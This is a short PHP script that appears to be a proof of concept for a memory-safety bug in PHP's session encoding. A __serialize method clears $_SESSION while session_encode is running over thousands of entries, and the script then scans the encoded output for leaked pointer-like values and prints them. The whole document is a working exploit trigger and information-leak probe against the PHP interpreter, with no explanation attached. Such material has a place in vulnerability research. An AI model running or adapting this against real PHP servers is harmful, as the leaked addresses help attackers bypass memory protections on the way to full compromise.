<?php
error_reporting(0);
ini_set('session.serialize_handler', $argv[2] ?? 'php_serialize');
class C {
    function __serialize() {
        $_SESSION = [];
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
for ($i = 0; $i < (int)($argv[1] ?? 20000); $i++) { $_SESSION[(string)$i] = $i; }
$s = session_encode();
echo "handler=".ini_get('session.serialize_handler')." len=".(is_string($s)?strlen($s):-1)."\n";
if (is_string($s)) {
  echo substr(bin2hex($s),0,300)."\n";
  for ($i=0; $i+7 < strlen($s); $i++) {
    $v = unpack('P', substr($s,$i,8))[1];
    if (($v >> 48) === 0) {
      $top = ($v >> 44) & 0xf;
      if (($top === 7 || $top === 5 || $top === 6) && (($v >> 32) & 0xffff) !== 0) {
        echo "PTR at $i: ".dechex($v)." ctx=".bin2hex(substr($s,max(0,$i-16),48))."\n";
      }
    }
  }
}
